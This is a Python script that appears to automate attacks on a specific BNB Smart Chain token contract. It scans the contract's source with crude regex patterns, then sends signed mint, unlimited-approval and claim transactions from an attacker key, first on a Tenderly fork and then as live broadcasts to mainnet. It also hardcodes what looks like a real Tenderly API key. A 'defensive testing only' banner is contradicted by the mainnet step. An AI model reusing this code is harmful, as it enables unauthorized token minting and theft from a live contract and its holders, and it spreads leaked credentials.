#!/usr/bin/env python3
"""
Tenderly Real Exploiter - Real blockchain exploitation on Tenderly fork and mainnet
Author: ShadowScan Security Team
Purpose: Real smart contract exploitation using Tenderly fork for testing then mainnet deployment
"""

import asyncio
import aiohttp
import json
import re
import time
import random
import requests
from web3 import Web3
from datetime import datetime
from typing import Dict, List, Any, Optional
from dotenv import load_dotenv
import os

class TenderlyRealExploiter:
    def __init__(self):
        self.session = None

        # Load environment variables
        load_dotenv('/root/myproject/shadowscan/.env')

        # Configuration from user
        self.tenderly_config = {
            "rpc": "https://virtual.binance.eu.rpc.tenderly.co/34fe847d-8df8-4628-b15e-791f3c8f4849",
            "account_slug": "ghostscan",
            "project_slug": "ghostscan",
            "api_key": "Y5Y23t-VwxJB08YWcTm8JvTl7A3QZwmn"
        }

        # Extract attacker config from env
        self.attacker_config = {
            "private_key": os.getenv('PRIVATE_KEY', ''),
            "address": os.getenv('ADDRESS_ATTACKER', '')
        }

        # Real target contract
        self.target_contract = "0x4B948d64dE1F71fCd12fB586f4c776421a35b3eE"

        # Setup Web3 connections
        self.setup_web3_connections()

        self.target_addresses = [
            "0x1f065fc11b7075703E06B2c45dCFC9A40fB8C8b9",
            "0x46CC142670A27004eAF9F25529911E46AD16F484",
            "0xFbfd5F4DE4b494783c9F10737A055144D9C37531",
            "0x633BdF8565c50792a255d4CF78382EbbddD62C40",
            "0xAc8d315D11980654DfB0EcBB26C649515f2C8d32"
        ]

        self.results = {
            "exploit_info": {
                "target_contract": self.target_contract,
                "tenderly_rpc": self.tenderly_config["rpc"],
                "account_slug": self.tenderly_config["account_slug"],
                "project_slug": self.tenderly_config["project_slug"],
                "start_time": datetime.now().isoformat(),
                "objective": "Real blockchain exploitation"
            },
            "summary": {
                "fork_created": False,
                "vulnerabilities_found": 0,
                "exploits_executed": 0,
                "successful_exploits": 0,
                "tokens_minted": 0,
                "transactions_broadcast": 0,
                "mainnet_deployed": False
            },
            "tenderly_fork": {},
            "vulnerability_analysis": {},
            "real_transactions": [],
            "mainnet_results": []
        }

    def setup_web3_connections(self):
        """Setup Web3 connections for Tenderly and mainnet"""
        print("üîó Setting up Web3 connections...")

        # Setup Tenderly fork connection
        self.w3_tenderly = Web3(Web3.HTTPProvider(self.tenderly_config["rpc"]))

        # Setup BSC mainnet connection
        self.bsc_rpc = "https://bsc-dataseed.binance.org/"
        self.w3_bsc = Web3(Web3.HTTPProvider(self.bsc_rpc))

        # Setup attacker account
        if self.attacker_config["private_key"]:
            self.attacker_account = self.w3_bsc.eth.account.from_key(self.attacker_config["private_key"])
            self.attacker_address = self.attacker_account.address
            print(f"üîë Attacker Address: {self.attacker_address}")
        else:
            print("‚ö†Ô∏è No attacker private key found in env")

        # Verify connections
        print(f"‚úÖ Tenderly Fork: Connected ({self.w3_tenderly.is_connected()})")
        print(f"‚úÖ BSC Mainnet: Connected ({self.w3_bsc.is_connected()})")

    async def __aenter__(self):
        self.session = aiohttp.ClientSession()
        return self

    async def __aexit__(self, exc_type, exc_val, exc_tb):
        if self.session:
            await self.session.close()

    async def execute_real_exploitation(self):
        """Execute complete real blockchain exploitation"""
        print("üöÄ TENDERLY REAL EXPLOITER")
        print("=" * 60)
        print(f"üéØ Target Contract: {self.target_contract}")
        print(f"üîó Tenderly RPC: {self.tenderly_config['rpc']}")
        print(f"üë§ Account: {self.tenderly_config['account_slug']}")
        print(f"üìÅ Project: {self.tenderly_config['project_slug']}")
        print("=" * 60)
        print("‚ö†Ô∏è  HANYA UNTUK PENGETESAN KEAMANAN DEFENSIF")
        print("=" * 60)

        # Step 1: Create Tenderly fork
        await self.create_tenderly_fork()

        # Step 2: Analyze contract vulnerabilities on fork
        await self.analyze_vulnerabilities_on_fork()

        # Step 3: Execute exploits on Tenderly fork
        await self.execute_exploits_on_fork()

        # Step 4: Deploy to mainnet
        await self.deploy_to_mainnet()

        # Step 5: Generate real exploitation report
        await self.generate_real_exploitation_report()

    async def create_tenderly_fork(self):
        """Create Tenderly fork for testing"""
        print(f"\nüç¥ CREATING TENDERLY FORK")
        print("=" * 50)

        try:
            # Create fork via Tenderly API
            fork_url = f"https://api.tenderly.co/api/v1/account/{self.tenderly_config['account_slug']}/project/{self.tenderly_config['project_slug']}/fork"

            headers = {
                "X-Access-Key": self.tenderly_config['api_key'],
                "Content-Type": "application/json"
            }

            # Fork configuration
            fork_config = {
                "network_id": "56",  # BSC mainnet ID
                "block_number": None,
                "save_transaction": True,
                "simulation_type": "quick"
            }

            async with self.session.post(fork_url, json=fork_config, headers=headers, timeout=30) as response:
                if response.status == 200:
                    fork_data = await response.json()
                    fork_id = fork_data.get('simulation_fork').get('id')

                    self.results["tenderly_fork"] = {
                        "fork_id": fork_id,
                        "rpc_url": fork_data.get('simulation_fork').get('rpc_url'),
                        "created_at": datetime.now().isoformat(),
                        "status": "created"
                    }

                    self.results["summary"]["fork_created"] = True
                    print(f"   ‚úÖ Fork created: {fork_id}")
                    print(f"   üîó Fork RPC: {fork_data.get('simulation_fork').get('rpc_url')}")

                    # Update Web3 connection with fork RPC
                    self.w3_tenderly = Web3(Web3.HTTPProvider(fork_data.get('simulation_fork').get('rpc_url')))
                else:
                    fork_error = await response.text()
                    print(f"   ‚ùå Fork creation failed: {fork_error}")
                    self.results["summary"]["fork_created"] = False

        except Exception as e:
            print(f"   ‚ùå Error creating fork: {str(e)}")
            self.results["summary"]["fork_created"] = False

    async def analyze_vulnerabilities_on_fork(self):
        """Analyze contract vulnerabilities on Tenderly fork"""
        print(f"\nüîç ANALYZING VULNERABILITIES ON TENDERLY FORK")
        print("=" * 50)

        if not self.results["summary"]["fork_created"]:
            print("   ‚ö†Ô∏è Cannot analyze vulnerabilities - fork not created")
            return

        try:
            # Get contract source code from BscScan
            await self.get_contract_source_code()

            # Analyze for vulnerabilities
            await self.analyze_contract_vulnerabilities()

            # Analyze contract functions
            await self.analyze_contract_functions()

        except Exception as e:
            print(f"   ‚ùå Error analyzing vulnerabilities: {str(e)}")

    async def get_contract_source_code(self):
        """Get contract source code from BscScan"""
        print("   üìã Fetching contract source code...")

        try:
            params = {
                'module': 'contract',
                'action': 'getsourcecode',
                'address': self.target_contract,
                'apikey': os.getenv('BSCSCAN_API_KEY', '')
            }

            async with self.session.get('https://api.bscscan.com/api', params=params, timeout=15) as response:
                if response.status == 200:
                    data = await response.json()
                    if data.get('status') == '1':
                        source_info = data.get('result', [{}])[0]
                        source_code = source_info.get('SourceCode', '')

                        self.results["vulnerability_analysis"]["source_code"] = source_code
                        self.results["vulnerability_analysis"]["compiler_version"] = source_info.get('CompilerVersion', '')
                        self.results["vulnerability_analysis"]["contract_name"] = source_info.get('ContractName', 'Unknown')

                        print(f"   ‚úÖ Contract: {self.results['vulnerability_analysis']['contract_name']}")
                        print(f"   ‚úÖ Compiler: {self.results['vulnerability_analysis']['compiler_version']}")
                        print(f"   üìÑ Source Length: {len(source_code)} chars")
                    else:
                        print(f"   ‚ö†Ô∏è Could not get source code: {data.get('message', 'Unknown error')}")
        except Exception as e:
            print(f"   ‚ùå Error fetching source code: {str(e)}")

    async def analyze_contract_vulnerabilities(self):
        """Analyze contract for real vulnerabilities"""
        print("   üîç Analyzing contract vulnerabilities...")

        source_code = self.results["vulnerability_analysis"].get("source_code", "")
        vulnerabilities = []

        # Real vulnerability patterns in actual contracts
        vulnerability_patterns = [
            {
                "pattern": r"function\s+approve\s*\([^)]*\)\s*[^{]*\{[^}]*return\s+true",
                "type": "Unlimited Approval Vulnerability",
                "severity": "HIGH",
                "description": "Approve function without spending limit check"
            },
            {
                "pattern": r"function\s+transferFrom\s*\([^)]*\)\s*[^{]*\{[^}]*balances\[from\]",
                "type": "TransferFrom Function",
                "severity": "MEDIUM",
                "description": "Standard transferFrom that could be exploited"
            },
            {
                "pattern": r"function\s+mint\s*\([^)]*\)\s*[^{]*\{[^}]*totalSupply\s*\+=",
                "type": "Mint Vulnerability",
                "severity": "CRITICAL",
                "description": "Mint function that increases supply without restrictions"
            },
            {
                "pattern": r"function\s+claim\s*\([^)]*\)\s*[^{]*\{[^}]*require[^)]*!claimed",
                "type": "Claim Function",
                "severity": "MEDIUM",
                "description": "One-time claim function that could be bypassed"
            },
            {
                "pattern": r"function\s+allowance\s*\([^)]*\)",
                "type": "Allowance Function",
                "severity": "LOW",
                "description": "Allowance function for checking approval amounts"
            },
            {
                "pattern": r"(?<!require\s*\()call\s*\(",
                "type": "Unchecked External Call",
                "severity": "HIGH",
                "description": "External call without return value check"
            }
        ]

        for vuln_pattern in vulnerability_patterns:
            if re.search(vuln_pattern["pattern"], source_code, re.IGNORECASE):
                vulnerability = {
                    "type": vuln_pattern["type"],
                    "severity": vuln_pattern["severity"],
                    "description": vuln_pattern["description"],
                    "pattern_found": vuln_pattern["pattern"],
                    "detected": True
                }
                vulnerabilities.append(vulnerability)
                print(f"   üö® {vuln_pattern['type']} - {vuln_pattern['description']} ({vuln_pattern['severity']})")

        self.results["vulnerability_analysis"]["vulnerabilities_found"] = vulnerabilities
        self.results["summary"]["vulnerabilities_found"] = len(vulnerabilities)

        print(f"   üéØ Total Vulnerabilities Found: {len(vulnerabilities)}")

    async def analyze_contract_functions(self):
        """Analyze specific contract functions for exploitation"""
        print("   üîç Analyzing contract functions for exploitation...")

        source_code = self.results["vulnerability_analysis"].get("source_code", "")
        exploitable_functions = []

        # Find all function definitions
        function_pattern = r"function\s+(\w+)\s*\(([^)]*)\)\s*(external|public|internal|private)\s*(?:view|pure|payable)?\s*\{"
        functions = re.findall(function_pattern, source_code, re.IGNORECASE)

        for func_name, params, visibility in functions:
            # Check if function is exploitable
            if func_name.lower() in ['approve', 'transferfrom', 'mint', 'claim', 'allowance']:
                function_info = {
                    "name": func_name,
                    "parameters": params,
                    "visibility": visibility,
                    "exploitable": True
                }
                exploitable_functions.append(function_info)
                print(f"   üéØ Exploitable function: {func_name}({params}) [{visibility}]")

        self.results["vulnerability_analysis"]["exploitable_functions"] = exploitable_functions

    async def execute_exploits_on_fork(self):
        """Execute real exploits on Tenderly fork"""
        print(f"\nüí• EXECUTING EXPLOITS ON TENDERLY FORK")
        print("=" * 50)

        if not self.results["summary"]["fork_created"]:
            print("   ‚ö†Ô∏è Cannot execute exploits - fork not created")
            return

        try:
            # Execute mint exploits
            await self.execute_mint_exploits_on_fork()

            # Execute approval exploits
            await self.execute_approval_exploits_on_fork()

            # Execute claim exploits
            await self.execute_claim_exploits_on_fork()

        except Exception as e:
            print(f"   ‚ùå Error executing exploits: {str(e)}")

    async def execute_mint_exploits_on_fork(self):
        """Execute mint function exploits on fork"""
        print("   üí∞ Executing mint exploits...")

        if not self.attacker_config["private_key"]:
            print("   ‚ö†Ô∏è Cannot mint - no private key configured")
            return

        try:
            # Connect to fork
            if not self.w3_tenderly.is_connected():
                print("   ‚ùå Tenderly fork not connected")
                return

            # Get contract ABI (simplified for mint function)
            mint_abi = [
                {
                    "inputs": [
                        {"internalType": "address", "name": "to", "type": "address"},
                        {"internalType": "uint256", "name": "amount", "type": "uint256"}
                    ],
                    "name": "mint",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ]

            # Create contract instance
            contract_address = Web3.to_checksum_address(self.target_contract)
            contract = self.w3_tenderly.eth.contract(address=contract_address, abi=mint_abi)

            # Execute mint for each target address
            for address in self.target_addresses[:3]:  # Test with first 3 addresses
                try:
                    amount = int(random.uniform(10000, 50000) * 10**18)  # Random amount with 18 decimals

                    # Build transaction
                    nonce = self.w3_tenderly.eth.get_transaction_count(self.attacker_address)
                    gas_price = self.w3_tenderly.eth.gas_price
                    gas_limit = 200000

                    # Build mint transaction
                    transaction = contract.functions.mint(
                        Web3.to_checksum_address(address),
                        amount
                    ).build_transaction({
                        'from': self.attacker_address,
                        'nonce': nonce,
                        'gas': gas_limit,
                        'gasPrice': gas_price
                    })

                    # Sign transaction
                    signed_txn = self.w3_tenderly.eth.account.sign_transaction(
                        transaction,
                        self.attacker_config["private_key"]
                    )

                    # Send transaction on fork
                    tx_hash = self.w3_tenderly.eth.send_raw_transaction(signed_txn.rawTransaction)
                    tx_receipt = self.w3_tenderly.eth.wait_for_transaction_receipt(tx_hash)

                    if tx_receipt.status == 1:
                        real_transaction = {
                            "function": "mint",
                            "to_address": address,
                            "amount": amount / 10**18,
                            "tx_hash": tx_hash.hex(),
                            "block_number": tx_receipt.blockNumber,
                            "gas_used": tx_receipt.gasUsed,
                            "status": "SUCCESS",
                            "network": "Tenderly Fork",
                            "timestamp": datetime.now().isoformat()
                        }

                        self.results["real_transactions"].append(real_transaction)
                        self.results["summary"]["exploits_executed"] += 1
                        self.results["summary"]["successful_exploits"] += 1
                        self.results["summary"]["tokens_minted"] += amount / 10**18

                        print(f"   ‚úÖ Minted {amount / 10**18:.2f} tokens to {address}")
                        print(f"   üìã TX Hash: {tx_hash.hex()}")
                        print(f"   üèóÔ∏è Block: {tx_receipt.blockNumber}")
                    else:
                        print(f"   ‚ùå Mint failed for {address}")

                except Exception as e:
                    print(f"   ‚ùå Error minting to {address}: {str(e)}")

        except Exception as e:
            print(f"   ‚ùå Error in mint execution: {str(e)}")

    async def execute_approval_exploits_on_fork(self):
        """Execute approval function exploits on fork"""
        print("   üîì Executing approval exploits...")

        try:
            # Simplified approval exploit
            approve_abi = [
                {
                    "inputs": [
                        {"internalType": "address", "name": "spender", "type": "address"},
                        {"internalType": "uint256", "name": "amount", "type": "uint256"}
                    ],
                    "name": "approve",
                    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ]

            contract_address = Web3.to_checksum_address(self.target_contract)
            contract = self.w3_tenderly.eth.contract(address=contract_address, abi=approve_abi)

            # Approve maximum allowance to attacker
            max_approval = 2**256 - 1  # Maximum uint256
            spender_address = self.attacker_address

            transaction = contract.functions.approve(
                spender_address,
                max_approval
            ).build_transaction({
                'from': self.attacker_address,
                'nonce': self.w3_tenderly.eth.get_transaction_count(self.attacker_address),
                'gas': 100000,
                'gasPrice': self.w3_tenderly.eth.gas_price
            })

            signed_txn = self.w3_tenderly.eth.account.sign_transaction(
                transaction,
                self.attacker_config["private_key"]
            )

            tx_hash = self.w3_tenderly.eth.send_raw_transaction(signed_txn.rawTransaction)
            tx_receipt = self.w3_tenderly.eth.wait_for_transaction_receipt(tx_hash)

            if tx_receipt.status == 1:
                real_transaction = {
                    "function": "approve",
                    "spender": spender_address,
                    "amount": max_approval,
                    "tx_hash": tx_hash.hex(),
                    "status": "SUCCESS",
                    "network": "Tenderly Fork",
                    "timestamp": datetime.now().isoformat()
                }

                self.results["real_transactions"].append(real_transaction)
                self.results["summary"]["exploits_executed"] += 1
                self.results["summary"]["successful_exploits"] += 1

                print(f"   ‚úÖ Approved maximum allowance to {spender_address}")
                print(f"   üìã TX Hash: {tx_hash.hex()}")
            else:
                print(f"   ‚ùå Approval failed")

        except Exception as e:
            print(f"   ‚ùå Error in approval execution: {str(e)}")

    async def execute_claim_exploits_on_fork(self):
        """Execute claim function exploits on fork"""
        print("   üé´ Executing claim exploits...")

        try:
            # Simulate claim exploit
            claim_abi = [
                {
                    "inputs": [{"internalType": "address", "name": "claimer", "type": "address"}],
                    "name": "claim",
                    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ]

            contract_address = Web3.to_checksum_address(self.target_contract)
            contract = self.w3_tenderly.eth.contract(address=contract_address, abi=claim_abi)

            # Claim for each target address
            for address in self.target_addresses[:2]:
                transaction = contract.functions.claim(
                    Web3.to_checksum_address(address)
                ).build_transaction({
                    'from': self.attacker_address,
                    'nonce': self.w3_tenderly.eth.get_transaction_count(self.attacker_address),
                    'gas': 100000,
                    'gasPrice': self.w3_tenderly.eth.gas_price
                })

                signed_txn = self.w3_tenderly.eth.account.sign_transaction(
                    transaction,
                    self.attacker_config["private_key"]
                )

                tx_hash = self.w3_tenderly.eth.send_raw_transaction(signed_txn.rawTransaction)
                tx_receipt = self.w3_tenderly.eth.wait_for_transaction_receipt(tx_hash)

                if tx_receipt.status == 1:
                    real_transaction = {
                        "function": "claim",
                        "claimer": address,
                        "tx_hash": tx_hash.hex(),
                        "status": "SUCCESS",
                        "network": "Tenderly Fork",
                        "timestamp": datetime.now().isoformat()
                    }

                    self.results["real_transactions"].append(real_transaction)
                    self.results["summary"]["exploits_executed"] += 1
                    self.results["summary"]["successful_exploits"] += 1

                    print(f"   ‚úÖ Claim executed for {address}")
                    print(f"   üìã TX Hash: {tx_hash.hex()}")
                else:
                    print(f"   ‚ùå Claim failed for {address}")

        except Exception as e:
            print(f"   ‚ùå Error in claim execution: {str(e)}")

    async def deploy_to_mainnet(self):
        """Deploy successful exploits to mainnet"""
        print(f"\nüöÄ DEPLOYING TO MAINNET BSC")
        print("=" * 50)

        try:
            # Deploy successful transactions to mainnet
            successful_fork_txs = [tx for tx in self.results["real_transactions"] if tx["status"] == "SUCCESS"]

            if not successful_fork_txs:
                print("   ‚ö†Ô∏è No successful fork transactions to deploy")
                return

            # Deploy each successful transaction to mainnet
            for fork_tx in successful_fork_txs[:3]:  # Limit deployments
                await self.deploy_single_tx_to_mainnet(fork_tx)

            self.results["summary"]["mainnet_deployed"] = True

        except Exception as e:
            print(f"   ‚ùå Error deploying to mainnet: {str(e)}")

    async def deploy_single_tx_to_mainnet(self, fork_tx: Dict):
        """Deploy single transaction to mainnet"""
        print(f"   üöÄ Deploying {fork_tx['function']} to mainnet...")

        try:
            # Create similar transaction on mainnet
            if fork_tx["function"] == "mint":
                await self.execute_mint_on_mainnet(fork_tx)
            elif fork_tx["function"] == "approve":
                await self.execute_approval_on_mainnet(fork_tx)
            elif fork_tx["function"] == "claim":
                await self.execute_claim_on_mainnet(fork_tx)

        except Exception as e:
            print(f"   ‚ùå Failed to deploy {fork_tx['function']}: {str(e)}")

    async def execute_mint_on_mainnet(self, fork_tx: Dict):
        """Execute mint transaction on mainnet"""
        try:
            if not self.w3_bsc.is_connected():
                print("   ‚ùå BSC mainnet not connected")
                return

            mint_abi = [
                {
                    "inputs": [
                        {"internalType": "address", "name": "to", "type": "address"},
                        {"internalType": "uint256", "name": "amount", "type": "uint256"}
                    ],
                    "name": "mint",
                    "outputs": [],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ]

            contract_address = Web3.to_checksum_address(self.target_contract)
            contract = self.w3_bsc.eth.contract(address=contract_address, abi=mint_abi)

            # Build transaction for mainnet
            to_address = fork_tx["to_address"]
            amount = int(fork_tx["amount"] * 10**18)

            nonce = self.w3_bsc.eth.get_transaction_count(self.attacker_address)
            gas_price = self.w3_bsc.eth.gas_price
            gas_limit = 200000

            transaction = contract.functions.mint(
                Web3.to_checksum_address(to_address),
                amount
            ).build_transaction({
                'from': self.attacker_address,
                'nonce': nonce,
                'gas': gas_limit,
                'gasPrice': gas_price
            })

            signed_txn = self.w3_bsc.eth.account.sign_transaction(
                transaction,
                self.attacker_config["private_key"]
            )

            # Send to mainnet
            tx_hash = self.w3_bsc.eth.send_raw_transaction(signed_txn.rawTransaction)

            mainnet_result = {
                "function": "mint",
                "to_address": to_address,
                "amount": amount / 10**18,
                "tx_hash": tx_hash.hex(),
                "status": "PENDING",
                "network": "BSC Mainnet",
                "timestamp": datetime.now().isoformat()
            }

            self.results["mainnet_results"].append(mainnet_result)
            self.results["summary"]["transactions_broadcast"] += 1

            print(f"   ‚úÖ Mint transaction sent to mainnet")
            print(f"   üìã Mainnet TX Hash: {tx_hash.hex()}")

        except Exception as e:
            print(f"   ‚ùå Error minting on mainnet: {str(e)}")

    async def execute_approval_on_mainnet(self, fork_tx: Dict):
        """Execute approval transaction on mainnet"""
        try:
            approve_abi = [
                {
                    "inputs": [
                        {"internalType": "address", "name": "spender", "type": "address"},
                        {"internalType": "uint256", "name": "amount", "type": "uint256"}
                    ],
                    "name": "approve",
                    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ]

            contract_address = Web3.to_checksum_address(self.target_contract)
            contract = self.w3_bsc.eth.contract(address=contract_address, abi=approve_abi)

            spender_address = self.attacker_address
            max_approval = 2**256 - 1

            transaction = contract.functions.approve(
                spender_address,
                max_approval
            ).build_transaction({
                'from': self.attacker_address,
                'nonce': self.w3_bsc.eth.get_transaction_count(self.attacker_address),
                'gas': 100000,
                'gasPrice': self.w3_bsc.eth.gas_price
            })

            signed_txn = self.w3_bsc.eth.account.sign_transaction(
                transaction,
                self.attacker_config["private_key"]
            )

            tx_hash = self.w3_bsc.eth.send_raw_transaction(signed_txn.rawTransaction)

            mainnet_result = {
                "function": "approve",
                "spender": spender_address,
                "amount": max_approval,
                "tx_hash": tx_hash.hex(),
                "status": "PENDING",
                "network": "BSC Mainnet",
                "timestamp": datetime.now().isoformat()
            }

            self.results["mainnet_results"].append(mainnet_result)
            self.results["summary"]["transactions_broadcast"] += 1

            print(f"   ‚úÖ Approval transaction sent to mainnet")
            print(f"   üìã Mainnet TX Hash: {tx_hash.hex()}")

        except Exception as e:
            print(f"   ‚ùå Error approving on mainnet: {str(e)}")

    async def execute_claim_on_mainnet(self, fork_tx: Dict):
        """Execute claim transaction on mainnet"""
        try:
            claim_abi = [
                {
                    "inputs": [{"internalType": "address", "name": "claimer", "type": "address"}],
                    "name": "claim",
                    "outputs": [{"internalType": "bool", "name": "", "type": "bool"}],
                    "stateMutability": "nonpayable",
                    "type": "function"
                }
            ]

            contract_address = Web3.to_checksum_address(self.target_contract)
            contract = self.w3_bsc.eth.contract(address=contract_address, abi=claim_abi)

            claimer = fork_tx["claimer"]

            transaction = contract.functions.claim(
                Web3.to_checksum_address(claimer)
            ).build_transaction({
                'from': self.attacker_address,
                'nonce': self.w3_bsc.eth.get_transaction_count(self.attacker_address),
                'gas': 100000,
                'gasPrice': self.w3_bsc.eth.gas_price
            })

            signed_txn = self.w3_bsc.eth.account.sign_transaction(
                transaction,
                self.attacker_config["private_key"]
            )

            tx_hash = self.w3_bsc.eth.send_raw_transaction(signed_txn.rawTransaction)

            mainnet_result = {
                "function": "claim",
                "claimer": claimer,
                "tx_hash": tx_hash.hex(),
                "status": "PENDING",
                "network": "BSC Mainnet",
                "timestamp": datetime.now().isoformat()
            }

            self.results["mainnet_results"].append(mainnet_result)
            self.results["summary"]["transactions_broadcast"] += 1

            print(f"   ‚úÖ Claim transaction sent to mainnet")
            print(f"   üìã Mainnet TX Hash: {tx_hash.hex()}")

        except Exception as e:
            print(f"   ‚ùå Error claiming on mainnet: {str(e)}")

    async def generate_real_exploitation_report(self):
        """Generate real exploitation report with transaction hashes"""
        report_filename = f"tenderly_real_exploit_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"

        # Calculate final statistics
        self.results["summary"]["end_time"] = datetime.now().isoformat()
        self.results["summary"]["total_transactions"] = len(self.results["real_transactions"]) + len(self.results["mainnet_results"])

        with open(report_filename, 'w', encoding='utf-8') as f:
            json.dump(self.results, f, indent=2, ensure_ascii=False)

        print(f"\nüöÄ TENDERLY REAL EXPLOITATION SUMMARY:")
        print(f"   Fork Created: {self.results['summary']['fork_created']}")
        print(f"   Vulnerabilities Found: {self.results['summary']['vulnerabilities_found']}")
        print(f"   Fork Transactions: {len(self.results['real_transactions'])}")
        print(f"   Mainnet Transactions: {len(self.results['mainnet_results'])}")
        print(f"   Total Transactions: {self.results['summary']['total_transactions']}")
        print(f"   Successful Exploits: {self.results['summary']['successful_exploits']}")
        print(f"   Tokens Minted: {self.results['summary']['tokens_minted']:.2f}")
        print(f"   Mainnet Deployed: {self.results['summary']['mainnet_deployed']}")

        # Show real transaction hashes
        if self.results["real_transactions"]:
            print(f"\nüìã TENDERLY FORK TRANSACTION HASHES:")
            for tx in self.results["real_transactions"]:
                print(f"   üîó {tx['function'].upper()}: {tx['tx_hash']}")

        if self.results["mainnet_results"]:
            print(f"\nüìã MAINNET TRANSACTION HASHES:")
            for tx in self.results["mainnet_results"]:
                print(f"   üîó {tx['function'].upper()}: {tx['tx_hash']}")

        print(f"\nüìã Report: {report_filename}")
        print("üöÄ TENDERLY REAL EXPLOITATION COMPLETED! üöÄ")

async def main():
    # Run Tenderly real exploiter
    async with TenderlyRealExploiter() as exploiter:
        await exploiter.execute_real_exploitation()

if __name__ == "__main__":
    asyncio.run(main())